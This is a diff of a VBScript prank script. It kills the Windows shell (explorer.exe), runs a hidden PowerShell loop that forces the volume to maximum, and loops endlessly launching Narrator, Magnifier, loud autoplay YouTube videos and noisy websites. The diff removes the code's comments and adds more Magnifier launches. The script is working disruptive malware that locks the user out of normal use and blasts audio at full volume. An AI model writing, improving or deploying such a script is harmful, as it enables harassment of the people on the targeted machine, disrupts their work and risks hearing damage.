@@ -1,21 +1,17 @@
 Set WshShell = CreateObject("WScript.Shell")
 
-' ── one-time setup ───────────────────────────────────────────
 WshShell.Run "magnify.exe", 1, False
 WshShell.Run "narrator", 0, False
 WshShell.Run "taskkill /f /im explorer.exe", 0, False
 
-' slam volume to max immediately in a tight powershell loop
 WshShell.Run "powershell -w hidden -c ""$s=(New-Object -ComObject WScript.Shell); for($i=0;$i-lt60;$i++){$s.SendKeys([char]175); Start-Sleep -Milliseconds 20}""", 0, False
 
 WScript.Sleep 1000
 
-' ── main loop ────────────────────────────────────────────────
 Do
-    ' narrator every loop for extra chaos
     WshShell.Run "narrator", 0, False
+    WshShell.Run "magnify.exe", 1, False
 
-    ' rick astley — wait for page to load so audio actually plays
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1", 3, False
     WScript.Sleep 4000
 
@@ -28,7 +24,6 @@ Do
     WshShell.Run "https://www.nyan.cat/", 3, False
     WScript.Sleep 1000
 
-    ' never gonna give you up (other one)
     WshShell.Run "https://www.youtube.com/watch?v=XBk3Oa_YHKM&autoplay=1", 3, False
     WScript.Sleep 4000
 
@@ -44,13 +39,12 @@ Do
     WshShell.Run "http://www.smashthewalls.com/", 3, False
     WScript.Sleep 1000
 
-    ' ear rape video — wait for load
     WshShell.Run "https://www.youtube.com/watch?v=DLzxrzFCyOs&autoplay=1", 3, False
     WScript.Sleep 4000
 
     WshShell.Run "narrator", 0, False
+    WshShell.Run "magnify.exe", 1, False
 
-    ' keep volume maxed in background every loop
     WshShell.Run "powershell -w hidden -c ""$s=(New-Object -ComObject WScript.Shell); for($i=0;$i-lt30;$i++){$s.SendKeys([char]175); Start-Sleep -Milliseconds 20}""", 0, False
 
     WshShell.Run "calc", 3, False
@@ -66,6 +60,7 @@ Do
     WScript.Sleep 1500
 
     WshShell.Run "narrator", 0, False
+    WshShell.Run "magnify.exe", 1, False
 
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1", 3, False
     WScript.Sleep 4000
